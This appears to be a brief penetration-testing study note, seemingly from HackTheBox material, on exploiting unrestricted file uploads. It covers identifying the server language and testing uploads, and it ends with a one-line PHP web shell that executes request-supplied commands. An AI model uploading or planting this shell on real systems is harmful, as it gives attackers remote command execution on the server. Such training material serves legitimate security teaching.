# Basic Exploit

This is when the webapplication accepts any type of file without any validation, (can drag and drop any file type)

### Identifying Web Framework

A **web shell has to be written in the same programming language that runs the web server**, as it runs platform-specific functions and commands to execute system commands on the back-end server, making web shells non-cross-platform scripts

Easy method to determine what language runs the web application

* Access /index.ext and swap ext with various web extensions (php, asp, aspx)

> we can use ffuf or burp to enumerate the file extension. Note that some webapps doesn't use index page or have more than one web extensions

### Vulnerability Identification

After knowing web technologies, we have to check if the webapp is vulnerable.

Test with `<?php echo "Hello HTB";?>` and upload the text to the webapp

Then access the location where the file is stored.

```
http://SERVER_IP:PORT/uploads/test.php
```

### Assessment

```
<?php echo system($_REQUEST['cmd']); ?>
```
